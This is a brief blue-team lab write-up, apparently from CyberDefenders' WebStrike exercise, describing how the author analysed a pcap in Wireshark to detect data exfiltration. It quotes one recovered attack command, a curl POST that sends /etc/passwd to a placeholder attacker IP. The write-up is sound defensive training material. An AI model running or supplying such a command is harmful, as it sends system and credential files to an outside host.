# 🛡️ WebStrike – CyberDefenders Blue Team Lab

## 🧠 Summary
This lab simulated a **data exfiltration scenario**. As a blue teamer, my job was to analyze a `.pcap` file in **Wireshark** and identify whether an attacker tried to exfiltrate sensitive system files over the network.

## 🔬 What I Did
- Loaded the `WebStrike.pcap` file into **Wireshark**
- Used the filter: `tcp.stream eq 13` to track suspicious traffic
- Followed the TCP stream and discovered this command embedded in HTTP traffic:
  
  ```bash
  curl -X POST -d /etc/passwd http://<attacker-ip>
